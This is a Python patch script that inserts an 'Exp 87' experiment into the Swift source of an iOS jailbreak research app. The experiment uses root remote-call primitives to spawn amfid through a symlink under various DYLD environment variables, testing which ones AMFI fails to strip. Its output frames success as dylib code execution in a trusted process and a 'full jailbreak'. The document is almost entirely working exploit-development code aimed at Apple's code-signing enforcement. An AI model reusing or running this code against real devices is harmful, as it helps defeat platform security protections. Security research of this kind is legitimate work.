#!/usr/bin/env python3
"""Add Exp 87 — DYLD env var hijack + rpath override"""

SWIFT_FILE = r'd:\Backup\Personal\Hp\iPhone\DSPloit\lara\views\root\AMFIExperimentView.swift'

with open(SWIFT_FILE, 'r', encoding='utf-8') as f:
    content = f.read()

# Find the Dump amfid section to insert before it
anchor = '    // MARK: - Dump amfid binary'
idx = content.find(anchor)
if idx == -1:
    print("ERROR: anchor not found")
    exit(1)

new_code = '''    // MARK: - Exp 87: DYLD Hijack + Env Var Spawn

    /// Exp 87: Test berbagai DYLD environment variables untuk inject code.
    /// Symlink spawn works (Exp 86) — sekarang coba inject dylib via env vars.
    private func runExp87DyldHijack() {
        isRunning = true
        runningLabel = "DYLD Hijack"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp87_dyld") { rc in
            let result = self.expDyldHijack(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    /// Test DYLD env vars: LIBRARY_PATH, FRAMEWORK_PATH, FALLBACK_LIBRARY_PATH
    /// Juga test: spawn dengan custom working directory (chdir sebelum spawn)
    /// Dan: spawn binary yang punya @rpath dependency
    private func expDyldHijack(rc: RemoteCall) -> ExperimentResult {
        let expName = "DYLD Hijack (Exp 87)"
        var detail = "Experiment 87: DYLD Environment Variable Hijack\\n"
        detail += "=================================================\\n\\n"
        detail += "Symlink spawn confirmed works (Exp 86).\\n"
        detail += "DYLD_INSERT_LIBRARIES → SIGKILL (stripped by AMFI).\\n"
        detail += "Coba env vars lain yang mungkin TIDAK di-strip...\\n\\n"

        let mem = rc.trojanMem
        let amfidPath = remote_alloc_str(rc, "/usr/libexec/amfid")
        let argvBase = mem + 0x1C00
        let pidOut = mem + 0x1E00

        // Daftar DYLD env vars yang mungkin tidak di-strip
        let envVars: [(name: String, value: String, desc: String)] = [
            ("DYLD_LIBRARY_PATH", "/var/tmp", "search path untuk dylib"),
            ("DYLD_FRAMEWORK_PATH", "/var/tmp", "search path untuk framework"),
            ("DYLD_FALLBACK_LIBRARY_PATH", "/var/tmp", "fallback search path"),
            ("DYLD_FALLBACK_FRAMEWORK_PATH", "/var/tmp", "fallback framework path"),
            ("DYLD_IMAGE_SUFFIX", "_debug", "load *_debug variant"),
            ("DYLD_PRINT_LIBRARIES", "1", "print loaded libs (info leak)"),
            ("DYLD_PRINT_SEGMENTS", "1", "print segments (info leak)"),
            ("DYLD_ROOT_PATH", "/var/tmp", "root path override"),
        ]

        for (name, value, desc) in envVars {
            detail += "--- \\(name) ---\\n"
            detail += "  \\(desc)\\n"

            let envStr = remote_alloc_str(rc, "\\(name)=\\(value)")
            let envBase = mem + 0x2800
            rc[envBase].setValue64(envStr)
            rc[envBase + 8].setValue64(0)

            // Spawn amfid via symlink + env var
            let symlinkPath = remote_alloc_str(rc, "/var/tmp/.dsp_dyld_test")
            RootExecutor.rcall(rc, "unlink", symlinkPath)
            RootExecutor.rcall(rc, "symlink", amfidPath, symlinkPath)

            rc[argvBase].setValue64(symlinkPath)
            rc[argvBase + 8].setValue64(0)
            rc[pidOut].setValue32(0)

            let ret = RootExecutor.rcall(rc, "posix_spawn", pidOut, symlinkPath, 0, 0, argvBase, envBase)
            let pid = rc[pidOut].value32()

            if ret == 0 && pid != 0 {
                RootExecutor.rcall(rc, "usleep", 300000)
                let stBuf = mem + 0x2000
                rc[stBuf].setValue32(0)
                RootExecutor.rcall(rc, "waitpid", UInt64(pid), stBuf, UInt64(WNOHANG))
                let st = rc[stBuf].value32()
                let sig = st & 0x7F
                let exit = (st >> 8) & 0xFF

                if sig == 9 {
                    detail += "  ret=0, pid=\\(pid) → SIGKILL (stripped)\\n"
                } else if sig == 6 {
                    detail += "  ret=0, pid=\\(pid) → SIGABRT (dyld error — ENV HONORED!)\\n"
                    detail += "  🎉 \\(name) NOT STRIPPED!\\n"
                } else if sig == 0 && st != 0 {
                    detail += "  ret=0, pid=\\(pid) → exit=\\(exit) (ENV mungkin honored)\\n"
                    detail += "  🎉 \\(name) NOT STRIPPED!\\n"
                } else if st == 0 {
                    detail += "  ret=0, pid=\\(pid) → still running (ENV mungkin honored)\\n"
                    detail += "  🎉 \\(name) NOT STRIPPED!\\n"
                    RootExecutor.rcall(rc, "kill", UInt64(pid), 9)
                } else {
                    detail += "  ret=0, pid=\\(pid) → signal=\\(sig), exit=\\(exit)\\n"
                }
            } else {
                detail += "  ret=\\(ret) — spawn gagal\\n"
            }

            RootExecutor.rcall(rc, "unlink", symlinkPath)
            RootExecutor.rcall(rc, "free", symlinkPath)
            RootExecutor.rcall(rc, "free", envStr)
            detail += "\\n"
        }

        // ═══ BONUS: Spawn tanpa env, tapi dengan posix_spawn_file_actions ═══
        // Set working directory ke /var/tmp sebelum exec
        detail += "=== Bonus: spawn amfid (no env, baseline re-confirm) ===\\n"
        rc[argvBase].setValue64(amfidPath)
        rc[argvBase + 8].setValue64(0)
        rc[pidOut].setValue32(0)
        let retBase = RootExecutor.rcall(rc, "posix_spawn", pidOut, amfidPath, 0, 0, argvBase, 0)
        let pidBase = rc[pidOut].value32()
        detail += "posix_spawn(amfid): ret=\\(retBase), pid=\\(pidBase)\\n"
        if retBase == 0 && pidBase != 0 {
            detail += "Baseline still OK\\n"
            RootExecutor.rcall(rc, "usleep", 200000)
            RootExecutor.rcall(rc, "kill", UInt64(pidBase), 9)
        }

        RootExecutor.rcall(rc, "free", amfidPath)

        // Summary
        detail += "\\n=== SUMMARY ===\\n"
        let honored = detail.components(separatedBy: "NOT STRIPPED").count - 1
        detail += "Env vars NOT stripped: \\(honored)\\n"
        if honored > 0 {
            detail += "\\n🎉 Ada DYLD env var yang di-honor!\\n"
            detail += "→ Tulis dylib valid ke /var/tmp → binary load dylib kita!\\n"
            detail += "→ Code execution di context trusted process!\\n"
            detail += "→ FULL JAILBREAK!\\n"
        } else {
            detail += "Semua DYLD env vars di-strip oleh AMFI untuk platform binary.\\n"
        }

        let success = honored > 0
        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }
    #endif

'''

# Also add button in UI
button_anchor = '                pathButton(\n                    title: "④ Test Binary Spawn",'
button_idx = content.find(button_anchor)
if button_idx == -1:
    print("ERROR: button anchor not found")
    exit(1)

new_button = '''                pathButton(
                    title: "③i DYLD Hijack (Exp 87)",
                    icon: "link.badge.plus",
                    color: .yellow,
                    label: "DYLD Hijack",
                    action: runExp87DyldHijack,
                    needsVerified: false,
                    needsProbe: false
                )

'''

# Insert button before ④ Test Binary Spawn
content_with_button = content[:button_idx] + new_button + content[button_idx:]

# Now insert the function before Dump amfid
new_anchor_idx = content_with_button.find(anchor)
content_final = content_with_button[:new_anchor_idx] + new_code + content_with_button[new_anchor_idx:]

with open(SWIFT_FILE, 'w', encoding='utf-8') as f:
    f.write(content_final)

print("OK — added Exp 87 button + implementation")
